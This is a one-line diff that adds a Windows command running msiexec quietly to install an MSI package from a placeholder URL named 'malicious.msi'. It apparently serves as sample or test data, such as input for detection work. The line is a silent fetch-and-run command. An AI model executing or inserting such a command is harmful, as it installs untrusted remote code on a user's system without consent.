@@ -1,0 +1,1 @@
+cmd /c "msiexec" /q /I "https://my/malicious.msi"
